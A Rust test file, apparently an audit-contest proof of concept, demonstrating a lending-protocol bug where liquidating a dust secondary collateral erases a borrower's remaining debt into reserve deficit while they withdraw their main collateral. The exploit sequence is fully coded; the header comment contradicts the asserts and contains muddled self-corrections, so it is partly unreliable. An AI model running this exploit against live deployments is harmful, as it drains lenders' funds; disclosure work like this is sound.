#![cfg(test)]

//! PoC for V12 Critical #44846 (unreviewed in the K2 contest repo artifacts):
//! "Single-asset cap check wrongfully forgives all remaining debt"
//!
//! Claim under test: in internal_liquidation_call, collateral_cap_triggered is
//! set when the collateral computed FOR THE SELECTED collateral_asset exceeds
//! the user's balance OF THAT ASSET. The code then treats that single-asset
//! exhaustion as whole-portfolio exhaustion: it adjusts debt_to_cover to cover
//! ALL of the user's remaining debt (N-08 adjustment) and burns the rest as
//! protocol bad debt (H-02/H-05 branch). In a multi-collateral account the
//! user may still hold large other collateral, so a liquidator who selects a
//! small (dust) secondary collateral asset causes the protocol to forgive
//! debt that is fully backed by the user's remaining collateral. The user
//! keeps the other collateral AND the debt is erased into reserve deficit.
//!
//! This test asserts the CORRECT behavior (withdrawal of remaining collateral
//! after such a liquidation must FAIL, because the debt has not been erased
//! ... which it has not: the bug means it WAS erased, so this test FAILS on
//! buggy code and documents the exploit).
//!
//! Numbers (7-decimal tokens, prices in 14 decimals, WAD=1e18, LT=8500 bps,
//! LTV=8000, bonus=500 bps, default partial-liq threshold 0.5 WAD):
//!   - A = primary collateral: user supplies 10,000 A (worth $10,000)
//!   - B = debt asset: user borrows 8,000 B (worth $8,000)
//!   - C = dust secondary collateral: user supplies 100 C (worth $100)
//!   - Health factor (all at $1.00):
//!       collateral_base = 10000 + 100 = 10100
//!       debt_base = 8000
//!       weighted threshold = 0.85 * 10100 = 8585
//!       HF = 8585 / 8000 = 1.0731  -> healthy
//!   - Liquidation is allowed only when HF < 1.0, so drop prices to make the
//!     position insolvent: drop A to $0.90 and C to $0.90:
//!       collateral_base = 10100 * 0.90 = 9090
//!       weighted threshold = 0.85 * 9090 = 7726.5
//!       HF = 7726.5 / 8000 = 0.9658  (< 1.0, > 0.5 => close factor 5000)
//!   - Liquidator selects collateral C (dust, balance 100, worth $90) and
//!     requests debt_to_cover = 10 (worth $10).
//!       close factor check: 10 <= 0.5 * (individual debt in B = 8000) OK
//!       collateral_amount_to_transfer = 10 * 1.05 * (90/90 price scale)
//!         = 10.5 tokens of C. That is < 100, so the cap does NOT trigger
//!         here — need debt_to_cover such that 1.05 * value(C seized) > 100.
//!       We need collateral_to_transfer > 100, i.e. debt_value*1.05 > $90
//!       => debt_value > $85.7 => debt_to_cover > 85.7 B tokens.
//!       But close factor cap: debt_to_cover <= 0.5 * individual_debt_base
//!         (individual debt of B = $8000) => up to $4000 allowed.
//!       Choose debt_to_cover = 100 (worth $100):
//!         collateral_to_transfer = 100 * 1.05 = 105 > 100 (C balance)
//!         => collateral_cap_triggered = TRUE.
//!       N-08 adjustment: adjusted_debt = ceil(100 * 100 / 105) = ceil(95.24)
//!         = 96  (debt units of B, 7 decimals: 100 tokens)
//!         Wait — the adjustment uses raw token amounts:
//!         dtc=100, ucb=100 (C balance), cat=105:
//!         adjusted = (100*100 + 105 - 1)/105 = 10099/105 = 96.18 -> 96.
//!         So only 96 of debt is repaid?? That would make the exploit SMALLER.
//!
//! Hold on — re-read the N-08 branch. The adjustment SCALES debt_to_cover DOWN
//! to the amount that exactly corresponds to the user's full C balance:
//! adjusted_debt = ceil(dtc * ucb / cat). With cat > ucb, adjusted < dtc.
//! So the liquidator only pays 96 (worth $96), seizes all 100 C, and then...
//! remaining_debt = 8000 - 96 = 7904 > 0 AND collateral_cap_triggered, so the
//! H-02/H-05 branch burns the ENTIRE remaining 7904 as bad debt / deficit.
//!
//! NET EFFECT: the liquidator paid ~$96 and erased ~$7,904 of debt. The user
//! keeps their 10,000 A (worth $9,000 at $0.90) and can withdraw it freely —
//! the position now shows 0 debt. The pool absorbs ~$7,904 as deficit.
//!
//! Correct behavior would be: seizing C (the only collateral offered) should
//! at most liquidate the debt proportionate to C's share of the portfolio,
//! OR the cap branch must check that the user's TOTAL collateral across all
//! assets is exhausted before forgiving remaining debt.

use crate::{a_token, debt_token, interest_rate_strategy, kinetic_router, price_oracle};
use k2_shared::WAD;
use soroban_sdk::{
    contract, contractimpl,
    testutils::{Address as _, Ledger, LedgerInfo},
    token, Address, Env, IntoVal, String, Symbol, Vec,
};

#[contract]
pub struct MockReflector;

#[contractimpl]
impl MockReflector {
    pub fn decimals(_env: Env) -> u32 {
        14
    }
}

fn setup_ledger(env: &Env) {
    env.ledger().set(LedgerInfo {
        sequence_number: 100,
        protocol_version: 23,
        timestamp: 1_000_000,
        network_id: Default::default(),
        base_reserve: 10,
        min_temp_entry_ttl: 10,
        min_persistent_entry_ttl: 10,
        max_entry_ttl: 3_000_000,
    });
}

fn setup_interest_rate_strategy(env: &Env, admin: &Address) -> Address {
    let contract_id = env.register(interest_rate_strategy::WASM, ());
    let mut init_args = Vec::new(env);
    init_args.push_back(admin.clone().into_val(env));
    init_args.push_back((0u128).into_val(env));
    init_args.push_back((40_000_000_000_000_000_000u128).into_val(env));
    init_args.push_back((100_000_000_000_000_000_000u128).into_val(env));
    init_args.push_back((800_000_000_000_000_000_000u128).into_val(env));
    let _: () = env.invoke_contract(&contract_id, &Symbol::new(env, "initialize"), init_args);
    contract_id
}

fn deploy_reserve(
    env: &Env,
    kinetic_router_addr: &Address,
    oracle_addr: &Address,
    admin: &Address,
    ltv: u32,
    liquidation_threshold: u32,
    liquidation_bonus: u32,
) -> (Address, Address, Address) {
    let token_admin = Address::generate(env);
    let underlying_token = env.register_stellar_asset_contract_v2(token_admin.clone());
    let underlying_addr = underlying_token.address();

    let irs_addr = setup_interest_rate_strategy(env, admin);
    let treasury = Address::generate(env);

    let params = kinetic_router::InitReserveParams {
        decimals: 7,
        ltv,
        liquidation_threshold,
        liquidation_bonus,
        reserve_factor: 1000,
        supply_cap: 0,
        borrow_cap: 0,
        borrowing_enabled: true,
        flashloan_enabled: true,
    };

    let a_token_addr = env.register(a_token::WASM, ());
    let a_token_client = a_token::Client::new(env, &a_token_addr);
    a_token_client.initialize(
        admin,
        &underlying_addr,
        kinetic_router_addr,
        &String::from_str(env, "aToken"),
        &String::from_str(env, "aTKN"),
        &params.decimals,
    );

    let debt_token_addr = env.register(debt_token::WASM, ());
    let debt_token_client = debt_token::Client::new(env, &debt_token_addr);
    debt_token_client.initialize(
        admin,
        &underlying_addr,
        kinetic_router_addr,
        &String::from_str(env, "debtToken"),
        &String::from_str(env, "dTKN"),
        &params.decimals,
    );

    let pool_configurator = Address::generate(env);
    let router_client = kinetic_router::Client::new(env, kinetic_router_addr);
    router_client.set_pool_configurator(&pool_configurator);
    router_client.init_reserve(
        &pool_configurator,
        &underlying_addr,
        &a_token_addr,
        &debt_token_addr,
        &irs_addr,
        &treasury,
        &params,
    );

    let oracle_client = price_oracle::Client::new(env, oracle_addr);
    let asset_oracle = price_oracle::Asset::Stellar(underlying_addr.clone());
    oracle_client.add_asset(admin, &asset_oracle);
    oracle_client.set_manual_override(
        admin,
        &asset_oracle,
        &Some(100_000_000_000_000u128),
        &Some(env.ledger().timestamp() + 604_800),
    );

    (underlying_addr, a_token_addr, debt_token_addr)
}

fn mint_and_approve(env: &Env, underlying: &Address, router: &Address, user: &Address, amount: u128) {
    let stellar_token = token::StellarAssetClient::new(env, underlying);
    stellar_token.mint(user, &(amount as i128));
    let token_client = token::Client::new(env, underlying);
    let expiration = env.ledger().sequence() + 1_000_000;
    token_client.approve(user, router, &(amount as i128), &expiration);
}

fn deploy_protocol(env: &Env) -> (Address, Address, Address, Address) {
    let admin = Address::generate(env);
    let emergency_admin = Address::generate(env);

    let kinetic_router_addr = env.register(kinetic_router::WASM, ());
    let kinetic_router = kinetic_router::Client::new(env, &kinetic_router_addr);

    let oracle_addr = env.register(price_oracle::WASM, ());
    let oracle_client = price_oracle::Client::new(env, &oracle_addr);
    let reflector_addr = env.register(MockReflector, ());
    let base_currency = Address::generate(env);
    let native_xlm = Address::generate(env);
    oracle_client.initialize(&admin, &reflector_addr, &base_currency, &native_xlm);

    let pool_treasury = Address::generate(env);
    let dex_router = Address::generate(env);
    kinetic_router.initialize(
        &admin,
        &emergency_admin,
        &oracle_addr,
        &pool_treasury,
        &dex_router,
        &None,
    );

    (kinetic_router_addr, oracle_addr, admin, emergency_admin)
}

fn set_asset_price(
    oracle_client: &price_oracle::Client,
    admin: &Address,
    asset: &Address,
    price: u128,
    env: &Env,
) {
    let asset_oracle = price_oracle::Asset::Stellar(asset.clone());
    oracle_client.reset_circuit_breaker(admin, &asset_oracle);
    oracle_client.set_manual_override(
        admin,
        &asset_oracle,
        &Some(price),
        &Some(env.ledger().timestamp() + 604_800),
    );
}

const D7: u128 = 10_000_000; // 1 token at 7 decimals

/// PoC #44846: dust secondary-collateral liquidation erases all debt as
/// bad debt while the user keeps their primary collateral.
#[test]
fn poc_44846_single_asset_cap_forgives_all_debt() {
    let env = Env::default();
    env.mock_all_auths();
    env.budget().reset_unlimited();
    setup_ledger(&env);

    let (router_addr, oracle_addr, admin, _) = deploy_protocol(&env);
    let router = kinetic_router::Client::new(&env, &router_addr);
    let oracle_client = price_oracle::Client::new(&env, &oracle_addr);

    // A = primary collateral, B = debt, C = dust secondary collateral
    let (asset_a, atoken_a_addr, _) = deploy_reserve(&env, &router_addr, &oracle_addr, &admin, 8000, 8500, 500);
    let (asset_b, _, _) = deploy_reserve(&env, &router_addr, &oracle_addr, &admin, 8000, 8500, 500);
    let (asset_c, _, _) = deploy_reserve(&env, &router_addr, &oracle_addr, &admin, 8000, 8500, 500);

    let lp = Address::generate(&env);
    let user = Address::generate(&env);
    let liquidator = Address::generate(&env);

    // LP provides B liquidity (10x borrow amount)
    mint_and_approve(&env, &asset_b, &router_addr, &lp, 80_000 * D7);
    let lp_amt = 80_000 * D7;
    router.supply(&lp, &asset_b, &lp_amt, &lp, &0u32);

    // User: 10,000 A primary collateral + 100 C dust collateral
    mint_and_approve(&env, &asset_a, &router_addr, &user, 10_000 * D7);
    let a_amt = 10_000 * D7;
    router.supply(&user, &asset_a, &a_amt, &user, &0u32);
    mint_and_approve(&env, &asset_c, &router_addr, &user, 100 * D7);
    let c_amt = 100 * D7;
    router.supply(&user, &asset_c, &c_amt, &user, &0u32);

    // User borrows 8,000 B
    let b_amt = 8_000 * D7;
    router.borrow(&user, &asset_b, &b_amt, &1u32, &0u32, &user);

    // Liquidator needs B to repay: 200 is plenty (we pay ~96)
    mint_and_approve(&env, &asset_b, &router_addr, &liquidator, 200 * D7);

    let pre = router.get_user_account_data(&user);
    assert!(pre.health_factor >= WAD, "healthy at start, HF={}", pre.health_factor);

    // Crash A and C to $0.90 (B stays $1.00): HF = (10100*0.9*0.85)/8000 ≈ 0.966
    set_asset_price(&oracle_client, &admin, &asset_a, 90_000_000_000_000, &env);
    set_asset_price(&oracle_client, &admin, &asset_c, 90_000_000_000_000, &env);

    let ins = router.get_user_account_data(&user);
    assert!(
        ins.health_factor < WAD,
        "position must be insolvent, HF={}",
        ins.health_factor
    );
    assert!(
        ins.health_factor >= 500_000_000_000_000,
        "HF must stay above 0.5 (close factor 5000), HF={}",
        ins.health_factor
    );

    // Liquidator picks DUST collateral C and requests 100 B (worth $100).
    // collateral_to_transfer = 100 * 1.05 = 105 > 100 (C balance) => cap triggers.
    let dtc = 100 * D7;
    let result = router.try_liquidation_call(
        &liquidator,
        &asset_c, // dust collateral (NOT the primary A!)
        &asset_b,
        &user,
        &dtc,
        &false,
    );
    assert!(result.is_ok(), "liquidation of C should succeed: {:?}", result);

    // === EXPLOIT VERIFICATION ===
    // If the bug exists: debt is now ~0 (erased as bad debt), deficit > 0,
    // and the user can withdraw their 10,000 A freely.
    let post = router.get_user_account_data(&user);
    let deficit = router.get_reserve_deficit(&asset_b);

    // The bug: remaining debt (~7,904) was burned into deficit.
    assert!(
        post.total_debt_base < 10 * D7,
        "BUG CONFIRMED if true: debt erased (was 8000, now {})",
        post.total_debt_base
    );
    assert!(
        deficit > 7_000 * D7,
        "BUG CONFIRMED if true: ~7900 moved to reserve deficit (deficit={})",
        deficit
    );

    // The user still holds their primary collateral (aToken A balance) and
    // can withdraw it all.
    let a_token_a = a_token::Client::new(&env, &atoken_a_addr);
    let a_bal = a_token_a.balance(&user) as u128;
    assert!(
        a_bal >= 9_999 * D7,
        "user kept primary collateral: {}",
        a_bal
    );
    let w = router.try_withdraw(&user, &asset_a, &a_amt, &user);
    assert!(
        w.is_ok(),
        "BUG CONFIRMED if true: user withdraws ALL primary collateral debt-free: {:?}",
        w
    );
}
